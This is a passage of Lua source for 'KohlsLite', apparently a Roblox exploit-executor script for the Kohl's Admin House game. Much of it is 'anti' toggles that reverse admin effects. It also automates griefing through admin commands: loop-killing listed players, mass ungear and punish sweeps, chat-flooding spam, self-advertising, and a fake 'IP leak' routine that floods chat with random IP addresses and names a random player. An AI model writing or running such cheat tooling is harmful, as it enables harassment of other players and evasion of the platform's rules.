            if player.Character then
                local humanoid = player.Character:WaitForChild("Humanoid", 1)
                if humanoid and humanoid.Sit then
                    humanoid.Sit = false
                    Chat("unsit me")
                end
            end
        end

        if antis.antiseizure == true then
            if lp.Character:FindFirstChild("Seizure") then
                Chat("unseizure me")
                lp.Character.Torso.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                fwait()
                lp.Character:FindFirstChild("Seizure"):Destroy()
                lp.Character.Torso.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                lp.Character.Humanoid:ChangeState("GettingUp")
            end
        end

        if antis.antismoke == true then
            if lp.Character:FindFirstChild("Torso") then
                if lp.Character.Torso:FindFirstChild("Smoke") then
                    lp.Character.Torso:FindFirstChild("Smoke"):Destroy()
                    Chat("unsmoke me")
                end
            end
        end

        if antis.antisparkles == true then
            local torso = lp.Character:WaitForChild("Torso", 1)
            for i, v in pairs(torso:GetChildren()) do
                if v:IsA("Sparkles") then
                    v:Destroy()
                    Chat("unsparkle me")
                end
            end
        end

        if antis.antispeed == true then
            if lp.Character.Humanoid and lp.Character.Humanoid.WalkSpeed ~= 16 then
                lp.Character.Humanoid.WalkSpeed = 16
            end
        end

	if editedspeed == true then
            if lp.Character.Humanoid and lp.Character.Humanoid.WalkSpeed ~= editedspeedis then
                lp.Character.Humanoid.WalkSpeed = editedspeedis
            end
        end
		
        if antis.antispin == true then
            if lp.Character:FindFirstChild("Torso") then
                if lp.Character.Torso:FindFirstChild("SPINNER") then
                    lp.Character.Torso:FindFirstChild("SPINNER"):Destroy()
                    Chat("unspin me")
                end
            end
        end

        if antis.antistun == true then
            local player = lp
            if player.Character then
                local humanoid = player.Character:WaitForChild("Humanoid", 1)
                if humanoid and humanoid.PlatformStand then
                    humanoid.PlatformStand = false
                    Chat("unstun me")
                end
            end
        end

        if antis.antisetgrav == true then
            if lp.Character:FindFirstChild("Torso") then
                lproot = lp.Character.HumanoidRootPart
                for i, v in pairs(lp.Character:GetDescendants()) do
                    if v:IsA("BodyForce") then
                        v:Destroy()
                        v.Force = Vector3.new(0, 0, 0)
                        lproot.Velocity = Vector3.new(0, 0, 0)
                        lp.Character.HumanoidRootPart.CFrame =
                        	CFrame.new(lp.Character.HumanoidRootPart.Position.X,5,lp.Character.HumanoidRootPart.Position.Z)
                    	lp.Character.HumanoidRootPart.Velocity =
                        	Vector3.new(lp.Character.HumanoidRootPart.Velocity.X,0,lp.Character.HumanoidRootPart.Velocity.Z)
                    end

                    if v:IsA("BodyPosition") then
                        v:Destroy()
                        lproot.Velocity = Vector3.new(0, 0, 0)
			lp.Character.HumanoidRootPart.CFrame =
                        	CFrame.new(lp.Character.HumanoidRootPart.Position.X,5,lp.Character.HumanoidRootPart.Position.Z)
                    	lp.Character.HumanoidRootPart.Velocity =
                        	Vector3.new(lp.Character.HumanoidRootPart.Velocity.X,0,lp.Character.HumanoidRootPart.Velocity.Z)
                    end
                end
            end
        end

        if antis.antiswag == true then
            if lp.Character:FindFirstChild("EpicCape") then
                lp.Character:FindFirstChild("EpicCape"):Destroy()
                Chat("normal me")
            end
        end
    end)

-- Credits to trollfacenan (bumanoid)!
local lplr = game:GetService("Players").LocalPlayer
local char = lplr.Character
local tor = char:WaitForChild("Torso")
local oldvel = tor.Velocity

connections[#connections + 1] =
    tor.Changed:Connect(function()
        if tor.Velocity == Vector3.new(0, 0, 0) then
            tor.Velocity = oldvel
        end
    end)

connections[#connections + 1] =
    tor.ChildAdded:Connect(function(v)
        if v:IsA("BodyForce") and antis.antifling then
            v.Force = Vector3.new(0, 0, 0)
            char:FindFirstChildOfClass("Humanoid").Sit = false
            task.wait()
            char:FindFirstChildOfClass("Humanoid").Sit = false
            game:GetService("Debris"):AddItem(v, 0)
            repeat
                game:GetService("RunService").RenderStepped:Wait()
            until not v
        end
    end)

connections[#connections + 1] =
    lplr.CharacterAdded:Connect(function()
        tor = lplr.Character:WaitForChild("Torso")
        oldvel = tor.Velocity

        tor.ChildAdded:Connect(function(v)
                if v:IsA("BodyForce") and antis.antifling then
                    v.Force = Vector3.new(0, 0, 0)
                    char:FindFirstChildOfClass("Humanoid").Sit = false
                    task.wait()
                    char:FindFirstChildOfClass("Humanoid").Sit = false
                    game:GetService("Debris"):AddItem(v, 0)
                    repeat
                        game:GetService("RunService").RenderStepped:Wait()
                    until not v
                end
        end)

        tor.Changed:Connect(function()
                if tor.Velocity == Vector3.new(0, 0, 0) then
                    tor.Velocity = oldvel
                end
        end)
    end)

-- Anti mesh
connections[#connections + 1] =
    game:GetService("RunService").RenderStepped:Connect(function()
	task.wait()
	if antis.antimesh then
        	for i,v in pairs(workspace:GetDescendants()) do
            		if v:IsA("Accessory") then
                		if tostring(v.AccessoryType) == "Enum.AccessoryType.Unknown" then -- he knocks
                    			v:Destroy()
                		end
            		end
        	end
	end
end)

-- ANTIS FOR EVERYONE
connections[#connections + 1] =
    game:GetService("RunService").RenderStepped:Connect(function()
		task.wait()
                for i, v in ipairs(game.Players:GetPlayers()) do
                        if v.Name ~= game.Players.LocalPlayer.Name then

         		        if autocharall == true then 
                                        if autocharid ~= v.CharacterAppearanceId then
                                                      Chat('char '..v.Name..' '..autocharid)
                                        else end
                                end

                                if ALLantiaddon == true then
                                            if v.Character and v.Character:FindFirstChild("Addon") then
                                                    Chat("reset "..v.Name)
                                           end
                                end

                                if ALLanticlone == true then
                                            if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild(v.Name) then
                                                Chat("unclone "..v.Name)
                                        else end
                                end

                                if ALLantidog == true then
                                             for i,x in pairs(v.Character:GetDescendants()) do
                                                if x:IsA("Seat") then
                                                        Chat("undog "..v.Name)
                                                else end
                                        end
                                end

                                if ALLantifire == true then
                                            if v.Character and v.Character:FindFirstChild("Torso") then
                                                if v.Character.Torso:FindFirstChild("Fire") then
                                                            Chat("unfire "..v.Name)
                                                else end
                                        else end
                                end

                                if ALLantifreeze == true then
                                             if v.Character and v.Character:FindFirstChild("ice") then
                                                        Chat("thaw "..v.Name)
                                        else end
                                end

                                if ALLantifly == true or gjdelock == true then
                                            if not v.Character:FindFirstChild("Seizure") and v.Character.Humanoid:GetState().Name == "PlatformStanding" then
                                                Chat("unfly "..v.Name)
                                                        Chat("clip "..v.Name)
                                        else end
                                end

                                if ALLantiff == true then
                                         if v.Character and v.Character:FindFirstChild("ForceField") then
                                                Chat("unff "..v.Name)
                                        else end
                                end

                                 if checkperm2 == true then
                                         if v.Character and v.Character:FindFirstChild("ForceField") then
                                                if not table.find(permusers, v.Name) then
                                                        print(v.Name.." has perm.")
                                                        table.insert(permusers, v.Name)
                                                        Chat("unff "..v.Name)
                                                end
                                            end
                                 end

                                if ALLantiglow == true then
                                        local torso = v.Character:WaitForChild("Torso", 1)
                                        for i,x in pairs(torso:GetChildren()) do
                                                if x:IsA("PointLight") then
                                                            x:Destroy()
                                                            Chat("unglow "..v.Name)
                                                       end
                                            end
                                end

                                if ALLantihealthc == true then
                                           if v.Character.Humanoid.Health ~= 100 then
                                                Chat("health "..v.Name.." 100")
                                        else end
                                        end

                                if ALLantijail == true then
                                            if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild(v.Name .. "'s jail") then
                                                        Chat("unjail "..v.Name)
                                        else end
                                        end

                                if ALLantijump == true then
                                            if v.Character.Humanoid.JumpPower ~= 50 then
                                                Chat("normaljump "..v.Name)
                                          else end
                                end

                                if ALLantikill == true or table.find(antikill, v.Name) then
                                           if v.Character.Humanoid.Health == 0 then
                                                    Chat("reset "..v.Name)
                                          else end
                                end

                                if table.find(loopkill, v.Name) then
                                        if v.Character.Humanoid.Health ~= 0 then
                                                    Chat("kill "..v.Name)
                                        end
                                end

                                if ALLantichar == true then
                                           if v.UserId ~= v.CharacterAppearanceId then
                                                      Chat("unchar "..v.Name)
                                        else end
                                end

                                if ALLantiname == true then
                                           if v and v.Character:FindFirstChildOfClass("Model") then
                                                Chat("reset "..v.Name)
                                           else end
                                end

                                if ALLantiparticles == true then
                                        local torso = v.Character:WaitForChild("Torso", 1)
                                        for i,x in pairs(torso:GetChildren()) do
                                                if x:IsA("ParticleEmitter") then
                                                            x:Destroy()
                                                            Chat("unparticle "..v.Name)
                                                       end
                                            end
                                end

                                if ALLantipunish == true then
                                            if game.Lighting:FindFirstChild(v.Name) then
                                                        Chat("unpunish "..v.Name)
                                          else end
                                end

                                if ALLantirocket == true then
                                           if v.Character and v.Character:FindFirstChild("Rocket") then
                                                Chat("reload "..v.Name)
                                          else end
                                end

                                if ALLantisit == true then
                                            local humanoid = v.Character:WaitForChild("Humanoid", 1)
                                            if humanoid and humanoid.Sit then
                                                        Chat("unsit "..v.Name)
                                        else end
                                end

                                if ALLantiseizure == true then
                                                if v.Character and v.Character:FindFirstChild("Seizure") then
                                                Chat("unseizure "..v.Name)
                                          else end
                                end

                                if ALLantismoke == true then
                                             if v.Character and v.Character:FindFirstChild("Torso") then
                                                        if v.Character.Torso:FindFirstChild("Smoke") then
                                                            Chat("unsmoke "..v.Name)
                                                  else end
                                          else end
                                end

                                if ALLantisparkles == true then
                                        local torso = v.Character:WaitForChild("Torso", 1)
                                        for i,x in pairs(torso:GetChildren()) do
                                                if x:IsA("Sparkles") then
                                                            x:Destroy()
                                                            Chat("unsparkle "..v.Name)
                                                       end
                                            end
                                end

                                if ALLantispeed == true then
                                            if v.Character.Humanoid.WalkSpeed ~= 16 then
                                                Chat("speed "..v.Name.." 16")
                                         else end
                                end

                                if ALLantispin == true then
                                        if v.Character and v.Character:FindFirstChild("Torso") then
                                                if v.Character.Torso:FindFirstChild("SPINNER") then
                                                            Chat("unspin "..v.Name)
                                                end
                                                end
                                end

                                if gjdelock == true then
                                            if not v.Character.Humanoid.WalkSpeed == 0 then
                                                        Chat("speed "..v.Name.." 0")
                                            end
                                end

                                if ALLantistun == true then
                                            local humanoid = v.Character:WaitForChild("Humanoid", 1)
                                            if humanoid and humanoid.PlatformStand then
                                                Chat("unstun "..v.Name)
                                            end
                                end

                                if ALLantisetgrav == true then
                                        if v.Character and v.Character:FindFirstChild("Torso") then
                                                if v.Character.Torso:FindFirstChildOfClass("BodyForce") then
                                                        Chat("respawn "..v.Name)
                                                end
                                                end
                                end

                                if ALLantiswag == true then
                                        if v.Character and v.Character:FindFirstChild("EpicCape") then
                                                Chat("normal "..v.Name)
                                        end
                                end

                        end                
                end
end)

-- Antis (tool related)
local crashTools = {"OrinthianSwordAndShield", "VampireVanquisher","Emerald Knights of the Seventh Sanctum Sword and Shield"}
local attachTools = {"IvoryPeriastron"}
local nogearTools = {"PortableJustice"}
local colourTools = {"PaintBucket", "SubspaceTripmine"}
local miscTools = {"DaggerofShatteredDimensions", "SledgeHammer", "AR", "Transmorpher"}
local ninejntools = {"HyperlaserGun","Transmorpher","ConfusoRay-672"}
local crashToolsLP = {"DriveBloxUltimateCar","BlueBucket","HotPotato"}

-- Function for the antis
game:GetService("RunService").RenderStepped:Connect(function()
        task.wait(0)

		for i, v in game.Players:GetPlayers() do
				if v.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, v.Name) and not table.find(pgwl, v.Name)) then
					if v.Backpack:FindFirstChildOfClass("Tool") then
						if antigear then
							Chat("ungear " .. v.Name)
							Chat("punish " .. v.Name)
							Chat("clr")
							Chat(prefix.."regen")

							if crash_an then
								Chat("h \n\n\n "..v.Name.." tried using a tool with anti-gear enabled. \n\n\n")
							end
						
							Remind("Anti-gear triggered by "..v.Name)
							print("Anti-gear triggered by "..v.Name)
						end
					end
				end

				if v.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, v.Name) and not table.find(pgwl, v.Name)) then
					if v.Character and v.Character:FindFirstChildOfClass("Tool") then
						if antigear then
							Chat("ungear " .. v.Name)
							Chat("punish " .. v.Name)
							Chat("clr")
							Chat(prefix.."regen")

							if crash_an then
								Chat("h \n\n\n "..v.Name.." tried using a tool with anti-gear enabled. \n\n\n")
							end
						
							Remind("Anti-gear triggered by "..v.Name)
							print("Anti-gear triggered by "..v.Name)
						end
					end
				end
		end

		for i, tool in crashTools do
				for i, v in game.Players:GetPlayers() do
					if v.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, v.Name) and not table.find(pgwl, v.Name)) then
						if v.Backpack:FindFirstChild(tool) then
							if emranticrash then
								Chat("ungear others")
								Chat("punish others")
								Chat("clr")
								Chat(prefix .. "regen")

								if crash_an then
									Chat("h \n\n\n Someone tried using a crash tool with anti-crash enabled. \n\n\n")
								end
							
								Remind("Anti-crash triggered by "..v.Name)
								print("Anti-crash triggered by "..v.Name)
	
								if autoblvgc then
									Chat(prefix.."slock")
								end
							
							elseif anticrash then
								Chat("ungear " .. v.Name)
								Chat("punish " .. v.Name)
								Chat("clr")
								Chat(prefix .. "regen")

								if crash_an then
									Chat("h \n\n\n "..v.Name.." tried using a crash tool with anti-crash enabled. \n\n\n")
								end
							
								Remind("Anti-crash triggered by "..v.Name)
								print("Anti-crash triggered by "..v.Name)
	
								if autoblvgc then
									table.insert(blacklist, v.Name)
								end
							
							else end
						end
					end

					if v.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, v.Name) and not table.find(pgwl, v.Name)) then
						if v.Character and v.Character:FindFirstChild(tool) then
							if emranticrash then
								Chat("ungear others")
								Chat("punish others")
								Chat("clr")
								Chat(prefix .. "regen")

								if crash_an then
									Chat("h \n\n\n Someone tried using a crash tool with anti-crash enabled. \n\n\n")
								end
							
								Remind("Anti-crash triggered by "..v.Name)
								print("Anti-crash triggered by "..v.Name)
	
								if autoblvgc then
									Chat(prefix.."slock")
								end
							
							elseif anticrash then
								Chat("ungear " .. v.Name)
								Chat("punish " .. v.Name)
								Chat("clr")
								Chat(prefix .. "regen")

								if crash_an then
									Chat("h \n\n\n "..v.Name.." tried using a crash tool with anti-crash enabled. \n\n\n")
								end
							
								Remind("Anti-crash triggered by "..v.Name)
								print("Anti-crash triggered by "..v.Name)
							
								if autoblvgc then
									table.insert(blacklist, v.Name)
								end
							
							else end
						end
					end
				end

				if workspace:FindFirstChild(tool) then
					Chat("ungear others")
					Chat("punish others")
					Chat("clr")
					Chat(prefix .. "regen")

					if crash_an then
						Chat("h \n\n\n Crash tool found on workspace with anticrash enabled. \n\n\n")
					end

					Remind("Anti-crash tool found on workplace")
					print("Anti-crash tool found on workplace")
				end
		end

		for i, tool in attachTools do
				for i, v in game.Players:GetPlayers() do
					if v.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, v.Name) and not table.find(pgwl, v.Name)) then
						if v.Backpack:FindFirstChild(tool) then
							if antiattach2 then
								Chat("ungear " .. v.Name)
								Chat("punish " .. v.Name)
								Chat("clr")
								Chat(prefix .. "regen")

								if crash_an then
									Chat("h \n\n\n "..v.Name.." tried using a attaching tool with anti-attach2 enabled. \n\n\n")
								end

								Remind("Anti-attach2 triggered by "..v.Name)
								print("Anti-attach2 triggered by "..v.Name)
							end
						end
					end

					if v.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, v.Name) and not table.find(pgwl, v.Name)) then
						if v.Character and v.Character:FindFirstChild(tool) then
							if antiattach2 then
								Chat("ungear " .. v.Name)
								Chat("punish " .. v.Name)
								Chat("clr")
								Chat(prefix .. "regen")

								if crash_an then
									Chat("h \n\n\n "..v.Name.." tried using a attaching tool with anti-attach2 enabled. \n\n\n")
								end

								Remind("Anti-attach2 triggered by "..v.Name)
								print("Anti-attach2 triggered by "..v.Name)
							end
						end
					end
				end

				if workspace:FindFirstChild(tool) then
					Chat("ungear others")
					Chat("punish others")
					Chat("clr")
					Chat(prefix .. "regen")

					if crash_an then
						Chat("h \n\n\n Attach tool found on workspace with anti-attach2 enabled. \n\n\n")
					end

					Remind("Anti-attach2 tool found on workplace")
					print("Anti-attach2 tool found on workplace")
				end
		end

		for i, tool in nogearTools do
				for i, v in game.Players:GetPlayers() do
					if v.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, v.Name) and not table.find(pgwl, v.Name)) then
						if v.Backpack:FindFirstChild(tool) then
							if antigb then
								Chat("ungear " .. v.Name)
								Chat("punish " .. v.Name)
								Chat("clr")
								Chat(prefix .. "regen")

								if crash_an then
									Chat("h \n\n\n "..v.Name.." tried using a gearban tool with anti-gearban enabled. \n\n\n")
								end

								Remind("Anti-gearban triggered by "..v.Name)
								print("Anti-gearban triggered by "..v.Name)
							end
						end
					end

					if v.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, v.Name) and not table.find(pgwl, v.Name)) then
						if v.Character and v.Character:FindFirstChild(tool) then
							if antigb then
								Chat("ungear " .. v.Name)
								Chat("punish " .. v.Name)
								Chat("clr")
								Chat(prefix .. "regen")

								if crash_an then
									Chat("h \n\n\n "..v.Name.." tried using a gearban tool with anti-gearban enabled. \n\n\n")
								end

								Remind("Anti-gearban triggered by "..v.Name)
								print("Anti-gearban triggered by "..v.Name)
							end
						end
					end
				end

				if workspace:FindFirstChild(tool) then
					Chat("ungear others")
					Chat("punish others")
					Chat("clr")
					Chat(prefix .. "regen")

					if crash_an then
						Chat("h \n\n\n Gearban tool found on workspace with anti-gearban enabled. \n\n\n")
					end

					Remind("Anti-gearban tool found on workspace")
					print("Anti-gearban tool found on workspace")
				end
		end

		for i, tool in colourTools do
				for i, v in game.Players:GetPlayers() do
					if v.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, v.Name) and not table.find(pgwl, v.Name)) then
						if v.Backpack:FindFirstChild(tool) then
							if antipaint then
								Chat("ungear " .. v.Name)
								Chat("punish " .. v.Name)
								Chat("clr")
								Chat(prefix .. "regen")

								if crash_an then
									Chat("h \n\n\n "..v.Name.." tried using a paint tool with anti-paint enabled. \n\n\n")
								end

								Remind("Anti-paint triggered by "..v.Name)
								print("Anti-paint triggered by "..v.Name)
							end
						end
					end

					if v.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, v.Name) and not table.find(pgwl, v.Name)) then
						if v.Character and v.Character:FindFirstChild(tool) then
							if antipaint then
								Chat("ungear " .. v.Name)
								Chat("punish " .. v.Name)
								Chat("clr")
								Chat(prefix .. "regen")

								if crash_an then
									Chat("h \n\n\n "..v.Name.." tried using a paint tool with anti-paint enabled. \n\n\n")
								end

								Remind("Anti-paint triggered by "..v.Name)
								print("Anti-paint triggered by "..v.Name)
							end
						end
					end
				end

				if workspace:FindFirstChild(tool) then
					Chat("ungear others")
					Chat("punish others")
					Chat("clr")
					Chat(prefix .. "regen")

					if crash_an then
						Chat("h \n\n\n Paint tool found on workspace with anti-paint enabled. \n\n\n")
					end

					Remind("Anti-paint tool found on the workspace")
					print("Anti-paint tool found on the workspace")
				end
		end

		for i, tool in miscTools do
				for i, v in game.Players:GetPlayers() do
					if v.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, v.Name) and not table.find(pgwl, v.Name)) then
						if v.Backpack:FindFirstChild(tool) then
							if noblt then
								Chat("ungear " .. v.Name)
								Chat("punish " .. v.Name)
								Chat("clr")
								Chat(prefix .. "regen")

								if crash_an then
									Chat("h \n\n\n "..v.Name.." tried using a blacklisted tool. \n\n\n")
								end

								Remind("Blacklisted tool found on "..v.Name)
								print("Blacklisted tool found on "..v.Name)
							end
						end
					end

					if v.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, v.Name) and not table.find(pgwl, v.Name)) then
						if v.Character and v.Character:FindFirstChild(tool) then
							if noblt then
								Chat("ungear " .. v.Name)
								Chat("punish " .. v.Name)
								Chat("clr")
								Chat(prefix .. "regen")

								if crash_an then
									Chat("h \n\n\n "..v.Name.." tried using a blacklisted tool. \n\n\n")
								end

								Remind("Blacklisted tool found on "..v.Name)
								print("Blacklisted tool found on "..v.Name)
							end
						end
					end
				end

				if workspace:FindFirstChild(tool) then
					Chat("ungear others")
					Chat("punish others")
					Chat("clr")
					Chat(prefix .. "regen")

					if crash_an then
						Chat("h \n\n\n Blacklisted tool found on workspace. \n\n\n")
					end

					Remind("Blacklisted tool found on the workspace")
					print("Blacklisted tool found on the workspace")
				end
		end

		for i, tool in ninejntools do
				for i, v in game.Players:GetPlayers() do
					if v.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, v.Name) and not table.find(pgwl, v.Name)) then
						if v.Backpack:FindFirstChild(tool) then
							if antiraygun then
								Chat("ungear " .. v.Name)
								Chat("punish " .. v.Name)
								Chat("clr")
								Chat(prefix .. "regen")

								if crash_an then
									Chat("h \n\n\n "..v.Name.." tried using a tool 9jn doesn't like. \n\n\n")
								end

								Remind(v.Name.." used a tool 9jn doesn't like!")
								print(v.Name.." used a tool 9jn doesn't like!")
							end
						end
					end

					if v.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, v.Name) and not table.find(pgwl, v.Name)) then
						if v.Character and v.Character:FindFirstChild(tool) then
							if antiraygun then
								Chat("ungear " .. v.Name)
								Chat("punish " .. v.Name)
								Chat("clr")
								Chat(prefix .. "regen")

								if crash_an then
									Chat("h \n\n\n "..v.Name.." tried using a tool 9jn doesn't like. \n\n\n")
								end

								Remind(v.Name.." used a tool 9jn doesn't like!")
								print(v.Name.." used a tool 9jn doesn't like!")
							end
						end
					end
				end

				if workspace:FindFirstChild(tool) then
					Chat("ungear others")
					Chat("punish others")
					Chat("clr")
					Chat(prefix .. "regen")

					if crash_an then
						Chat("h \n\n\n A tool 9jn doesn't like was found on workspace. \n\n\n")
					end

					Remind("A tool 9jn doesn't like was found on the workspace!")
					print("A tool 9jn doesn't like was found on the workspace!")
				end
		end

		for i, tool in crashToolsLP do
				for i, v in game.Players:GetPlayers() do
					if v.Name == game.Players.LocalPlayer.Name then
						if v.Backpack:FindFirstChild(tool) then
							if antikick2 then
								tool:Destroy()
							end
						end
					end

					if v.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, v.Name) and not table.find(pgwl, v.Name)) then
						if v.Character and v.Character:FindFirstChild(tool) then
							if antikick2 then
								tool:Destroy()
							end
						end
					end
				end
		end

                for i, gear in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                            if gear:IsA("Tool") and antitoolm == true then
                                        gear:Destroy()
                            end
        	end

end)

-- anti tp 
game:GetService("RunService").RenderStepped:Connect(function()
        task.wait(0)
	if antitp then
		local lplr = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
		local hrp = lplr:WaitForChild("HumanoidRootPart")

		if pos1 == nil then
			pos1 = hrp.CFrame
			pos2 = hrp.CFrame
		end

		local distance = (Vector3.new(pos1.x, pos1.y, pos1.z) - Vector3.new(pos2.x, pos2.y, pos2.z)).Magnitude
		if math.floor(distance) > 8 then
			hrp.CFrame = CFrame.new(Vector3.new(pos1.x, pos1.y, pos1.z))
			pos1 = hrp.CFrame
			pos2 = hrp.CFrame
		else
			pos1 = pos2
			pos2 = hrp.CFrame
		end
	end
end)

-- CHAT F*CK
function ChatFudge()
Speak("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻")
Speak("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻")
Speak("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻")
end

function Mover:CleanUp()
    Mover.Attached.Value = false
    Mover.PosSet = false
    Mover.FPosSet = false
    Mover.Moving = false
    Mover.Finished.Value = false
    workspace.Gravity, workspace.FallenPartsDestroyHeight = 198.2, -500

    for _,v in pairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") and v.Name ~= "Rocket" then
            v.CanCollide = true   
        end
    end
end

function Mover:pingWait()
    if (game.Players.LocalPlayer:GetNetworkPing() * 2000) <= 60 then
        wait(.25)
    else
        wait((game.Players.LocalPlayer:GetNetworkPing() * 2000) / 533.3333333)
    end
end

function Mover:Attach(object, moveToPos)
    if game.Players.LocalPlayer.Character and object then
        local Root = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        while Root do
            wait()
            if Root.Parent.Torso:FindFirstChild("Weld") or Root.Parent.Torso:FindFirstChild("Snap") then
                local Weld = Root.Parent.Torso:FindFirstChild("Weld") or Root.Parent.Torso:FindFirstChild("Snap")
                if Weld.Part0 and Weld.Part1 then
                    local Part0 = Weld.Part0
                    local Part1 = Weld.Part1
                    if Part1 ~= object then
                        Chat('reset me')
                        Remind("Attached to wrong part.")
                        Mover:CleanUp()
                        break
                    elseif Part1 == object then
                        Mover.Attached.Value = true
                        break
                    end
                end
            end
            Root.CFrame = object.CFrame * CFrame.new(-1*(object.Size.X/2)-(Root.Size.X/2),0,0)
            Chat("unpunish me me me")
        end
    end
end

-- IP LEAK REAL :O :O :O
function IPBOOM()
	local number = math.random(1,255)
	local number2 = math.random(1,255)
	local number3 = math.random(1,255)
	local number4 = math.random(1,255)
	--print(number.."."..number2.."."..number3.."."..number4)
	Chat('h \n\n\n Everyone, check logs! \n\n\n')

	for i = 1,25 do
    		Chat("tp "..number.."."..number2.."."..number3.."."..number4)
	end

	task.wait(4)
	Chat('h \n\n\n Whoops, that was the wrong thing! \n\n\n')
	task.wait(4)

	local coems = {}
	for i, v in ipairs(game.Players:GetPlayers()) do
        	table.insert(coems, v.Name)
	end

	local randomPlayer = "Placeholder"
	choosenum = math.random(1, #coems)
	randomPlayer = coems[choosenum]

	Chat('h \n\n\n Hopefully '..randomPlayer..' forgives me... \n\n\n')
	if randomPlayer == game.Players.LocalPlayer.Name then
   		task.wait(4)
   		Chat("h \n\n\n Wait a second... that's me!!!!!!! \n\n\n")
	end

	for i in pairs(coems) do
    		table.remove(coems, i)
	end
end

GuiService = game:GetService("GuiService")
GuiService.ErrorMessageChanged:Connect(function()
	if autorejoin == true then
		REJOIN()
	end
end)

-- AD
function ADVERTISEMENT()
        Speak("KohlsLite is a very 'cool' KAH Script.")
        task.wait(1)
        Speak("Get it at script blox: search CMD LITE")
        task.wait(1)
        Speak("dm ts 2021 or check the logs")
        if haspersons == true then
                Chat("m/ \n\n\n ts2021 \n\n\n")
                Chat("h/ \n\n\n ts2021 \n\n\n")
		Chat("ff ts2021 on discord")
        else
                Chat("m \n\n\n ts2021 \n\n\n")
                Chat("h \n\n\n ts2021 \n\n\n")
		Chat("ff ts2021 on discord")
        end
end

function CADVERTISEMENT()
        Speak("Join the KAH Community server today!")
        task.wait(1)
        Speak("dm ts 2021 to join the kah community server or check the logs")
        if haspersons == true then
                Chat("m/ \n\n\n .gg / kah \n\n\n")
                Chat("h/ \n\n\n .gg / kah \n\n\n")
		Chat("ff discord.gg/kah")

        else
                Chat("m \n\n\n .gg / kah \n\n\n")
                Chat("h \n\n\n .gg / kah \n\n\n")
		Chat("ff discord.gg/kah")
        end
end

-- PROMPT TO SERVERHOP
function PtSH()
	local response = Instance.new("BindableFunction")
	function response.OnInvoke(answer)
		if answer == "Yes" then
		    	Chat(prefix.."serverhop")
		end
	end
	game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "KohlsLite Manager",
			Text = "This server is crashed. Would you like to serverhop?",
			Duration = math.huge,
			Callback = response,
			Button1 = "Yes",
			Button2 = "No"
	})
end

-- REJOIN
function REJOIN()
	if #game.Players:GetPlayers() <= 1 then
		game.Players.LocalPlayer:Kick("Rejoining...")
		wait()
		game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
	else
                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game:GetService("Players").LocalPlayer) 
	end
end

-- SERVERHOP 
function SERVERHOP()
        local Servers = game.HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"))
        for i,v in pairs(Servers.data) do
              if v.playing ~= v.maxPlayers then
                     game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, v.id)
            end
        end    
end

-- Serverhop (shortcut v1 version)
function SCSERVERHOP(randommobile, number)
	local x = {}
	for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
		if randommobile == true then
			if type(v) == "table" and v.playing == number and v.id ~= game.JobId then
				x[#x + 1] = v.id
				amount = number
			end
		else 
			if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
				x[#x + 1] = v.id
				amount = v.playing
			end
		end
	end
		
	if #x > 0 then
		Remind("Joining a server with "..amount.." players.")
		wait(0.25)
		game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, x[math.random(1, #x)])
	else
		Remind("Sorry, no server could be found.")
	end
end

-- alternate serverhop (iy version)
function IYServerhop()
    if httprequest then
        local servers = {}
        local req = httprequest({Url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true", game.PlaceId)})
        local body = game:GetService("HttpService"):JSONDecode(req.Body)

        if body and body.data then
            for i, v in next, body.data do
                if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= game.JobId then
                    table.insert(servers, 1, v.id)
                end
            end
        end

        if #servers > 0 then
            game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], game:GetService("Players").LocalPlayer)
        else
            return Remind("Sorry, no server could be found.")
        end
    else
